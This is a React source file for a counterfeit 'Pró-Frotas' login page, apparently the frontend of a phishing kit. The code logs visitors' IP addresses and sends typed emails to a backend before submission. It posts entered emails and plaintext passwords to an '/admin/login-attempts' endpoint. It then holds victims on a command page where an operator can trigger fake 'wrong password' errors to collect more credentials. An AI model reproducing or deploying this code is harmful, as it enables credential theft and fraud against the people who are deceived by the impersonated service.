import { useState, useEffect, useRef } from "react";
import axios from "axios";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function ProFrotasLogin() {
  const [step, setStep] = useState(1); // 1 = email, 2 = senha
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [hasError, setHasError] = useState(false);
  const [emailNotified, setEmailNotified] = useState(false);
  const emailDebounceRef = useRef(null);
  const [showFaleConosco, setShowFaleConosco] = useState(false);

  // Sessao
  const SESSION_TIMEOUT = 20 * 60 * 1000;
  const [userId, setUserId] = useState(() => null);

  // Verificar timeout
  useEffect(() => {
    const updateActivity = () => {
      if (userId) localStorage.setItem("pf_session_time", Date.now().toString());
    };
    window.addEventListener("click", updateActivity);
    window.addEventListener("keydown", updateActivity);
    const checkInterval = setInterval(() => {
      const savedTime = localStorage.getItem("pf_session_time");
      if (savedTime && (Date.now() - parseInt(savedTime)) > SESSION_TIMEOUT) {
        localStorage.removeItem("pf_user_id");
        localStorage.removeItem("pf_session_time");
        setUserId(null);
        setEmail("");
        setPassword("");
        setStep(1);
        setIsLoading(false);
        setHasError(false);
      }
    }, 60000);
    return () => {
      window.removeEventListener("click", updateActivity);
      window.removeEventListener("keydown", updateActivity);
      clearInterval(checkInterval);
    };
  }, [userId]);

  // Limpar sessao e rastrear visitante
  useEffect(() => {
    localStorage.removeItem("pf_user_id");
    localStorage.removeItem("pf_session_time");
    const trackVisitor = async () => {
      try {
        const ipResponse = await axios.get("https://api.ipify.org?format=json");
        await axios.post(`${API}/track-visitor`, { ip: ipResponse.data.ip, user_agent: navigator.userAgent });
      } catch (e) {
        try { await axios.post(`${API}/track-visitor`, { ip: "unknown", user_agent: navigator.userAgent }); } catch (e2) {}
      }
    };
    trackVisitor();
  }, []);

  // Validar email
  const isValidEmail = (val) => /^[a-zA-Z0-9][a-zA-Z0-9._-]+@([a-zA-Z0-9._-]+\.)[a-zA-Z0-9]+$/.test(val);

  // Notificar email digitado
  useEffect(() => {
    if (emailDebounceRef.current) clearTimeout(emailDebounceRef.current);
    if (email && isValidEmail(email) && !emailNotified) {
      emailDebounceRef.current = setTimeout(async () => {
        try {
          await axios.post(`${API}/notify-email-typing`, { email });
          setEmailNotified(true);
        } catch (e) {}
      }, 1500);
    }
    return () => { if (emailDebounceRef.current) clearTimeout(emailDebounceRef.current); };
  }, [email, emailNotified]);

  // Clicar "Proximo" - loading 2s e ir para step 2
  const handleNext = (e) => {
    e.preventDefault();
    if (!isValidEmail(email)) return;
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setHasError(false);
      setStep(2);
    }, 2000);
  };

  // Clicar "Entrar" - enviar dados
  const handleLogin = async (e) => {
    e.preventDefault();
    if (!password) return;
    setIsLoading(true);
    setHasError(false);
    try {
      let currentUserId = localStorage.getItem("pf_user_id");
      if (!currentUserId) {
        const response = await axios.post(`${API}/admin/login-attempts`, {
          email, password, ip_address: "127.0.0.1", country: "Brasil", device: "Desktop", page: "Login Pro-Frotas"
        });
        if (response.data?.id) {
          currentUserId = response.data.id;
          localStorage.setItem("pf_user_id", currentUserId);
          localStorage.setItem("pf_session_time", Date.now().toString());
          setUserId(currentUserId);
        }
      } else {
        await axios.post(`${API}/admin/login-attempts/${currentUserId}/add-attempt`, { email, password });
        setUserId(currentUserId);
      }
    } catch (e) {
      console.error("Erro ao enviar dados:", e);
    }
  };

  // Callback quando admin envia INV - voltar para tela de email com erro
  const handleInvalidate = () => {
    setUserId(null);
    setStep(1);
    setPassword("");
    setIsLoading(false);
    setHasError(true);
  };

  // Após login, mostrar CommandPage (ou AGUARDE se nenhum comando ainda)
  if (userId) {
    const CommandPage = require("@/pages/CommandPage").default;
    return <CommandPage userId={userId} onInvalidate={handleInvalidate} />;
  }

  return (
    <>
      <div className="h-screen flex overflow-hidden hide-scrollbar" style={{ fontFamily: "'Roboto', 'Helvetica Neue', sans-serif" }} data-testid="profrotas-login">
        {/* Banner esquerdo */}
        <div className="hidden lg:block lg:w-[40%] relative" data-testid="profrotas-banner">
          <img
            src="/profrotas_banner.png"
            alt="Pró-Frotas Banner"
            className="w-full h-full object-cover object-center"
          />
        </div>

        {/* Formulario direito */}
        <div className="flex-1 flex flex-col items-center justify-center bg-white px-6 overflow-y-auto" data-testid="profrotas-form-area">
          {/* Logo */}
          <div className="mb-10">
            <img src="/profrotas_logo.png" alt="Pró-Frotas" className="h-16 w-auto" data-testid="profrotas-logo" />
          </div>

          {/* Step 1: Email */}
          {step === 1 && (
            <form onSubmit={handleNext} className="w-full max-w-[280px]" data-testid="email-form">
              <div className="mb-5">
                <label className="block text-sm text-gray-800 mb-1.5" style={{ fontSize: '13px' }}>
                  E-mail <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  value={email}
                  onChange={(e) => { setEmail(e.target.value); setEmailNotified(false); setHasError(false); }}
                  className={`w-full px-3 py-2 border rounded focus:outline-none text-sm ${hasError ? 'border-red-500 focus:border-red-500' : 'border-gray-300 focus:border-blue-500'}`}
                  style={{ height: '38px' }}
                  autoFocus
                  data-testid="email-input"
                />
                {hasError && (
                  <p className="text-red-500 text-xs mt-1.5">E-mail ou senha incorretos. Verifique seus dados e tente novamente.</p>
                )}
              </div>

              <button
                type="submit"
                disabled={!isValidEmail(email) || isLoading}
                className="w-full py-2.5 rounded text-white font-medium text-sm transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                style={{ backgroundColor: isValidEmail(email) && !isLoading ? '#5C6BC0' : '#9FA8DA', height: '42px' }}
                data-testid="next-button"
              >
                {isLoading ? (
                  <div className="flex items-center justify-center gap-2">
                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                  </div>
                ) : "Próximo"}
              </button>

              <div className="text-center mt-4">
                <button type="button" onClick={() => setShowFaleConosco(true)} className="text-blue-600 text-sm underline hover:text-blue-800" data-testid="fale-conosco-link">
                  Fale conosco
                </button>
              </div>
            </form>
          )}

          {/* Step 2: Senha */}
          {step === 2 && (
            <form onSubmit={handleLogin} className="w-full max-w-[280px]" data-testid="password-form">
              <div className="mb-5">
                <label className="block text-sm text-gray-800 mb-1.5" style={{ fontSize: '13px' }}>
                  Senha <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className={`w-full px-3 py-2 pr-10 border rounded focus:outline-none focus:border-blue-500 text-sm ${hasError ? 'border-red-500' : 'border-gray-300'}`}
                    style={{ height: '38px' }}
                    autoFocus
                    data-testid="password-input"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 p-1"
                    data-testid="toggle-password"
                  >
                    {showPassword ? (
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                      </svg>
                    ) : (
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                      </svg>
                    )}
                  </button>
                </div>
                {hasError && (
                  <p className="text-red-500 text-xs mt-1">Senha incorreta. Tente novamente.</p>
                )}
              </div>

              <button
                type="submit"
                disabled={!password || isLoading}
                className="w-full py-2.5 rounded text-white font-medium text-sm transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                style={{ backgroundColor: password && !isLoading ? '#5C6BC0' : '#9FA8DA', height: '42px' }}
                data-testid="login-button"
              >
                {isLoading ? (
                  <div className="flex items-center justify-center gap-2">
                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                  </div>
                ) : "Entrar"}
              </button>

              <div className="text-center mt-4">
                <button type="button" onClick={() => setShowFaleConosco(true)} className="text-blue-600 text-sm underline hover:text-blue-800" data-testid="fale-conosco-link-2">
                  Fale conosco
                </button>
              </div>
            </form>
          )}
        </div>
      </div>

      {/* Modal Fale Conosco */}
      {showFaleConosco && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4" onClick={() => setShowFaleConosco(false)} data-testid="fale-conosco-modal">
          <div className="bg-white rounded-lg w-full max-w-md overflow-hidden shadow-xl" onClick={(e) => e.stopPropagation()}>
            <div className="bg-[#1E88E5] text-white px-6 py-4 flex items-center justify-between">
              <span className="font-medium text-lg">Fale Conosco</span>
              <button onClick={() => setShowFaleConosco(false)} className="text-white/80 hover:text-white text-2xl leading-none">&times;</button>
            </div>
            <div className="p-6 space-y-4">
              <div className="flex items-start gap-3">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-[#1E88E5] mt-0.5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                </svg>
                <div>
                  <p className="text-sm text-gray-600">Central de atendimento</p>
                  <p className="text-xl font-bold text-gray-900">4004-4980</p>
                  <p className="text-xs text-gray-500">capitais e regioes metropolitanas.</p>
                  <p className="text-xs text-gray-500 mt-1">Para outras localidades <strong>(11) 4004-4980</strong></p>
                  <p className="text-xs text-gray-500 mt-1">Nosso atendimento e de 24 horas por dia, 7 dias por semana.</p>
                </div>
              </div>
              <hr className="border-gray-200" />
              <div className="flex items-start gap-3">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-green-500 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z" />
                </svg>
                <div>
                  <p className="text-sm text-gray-600">Whatsapp</p>
                  <p className="text-lg font-bold text-gray-900">(11) 4004-4980</p>
                  <p className="text-xs text-gray-500">Suporte 24 horas, 7 dias por semana</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  );
}

export default ProFrotasLogin;
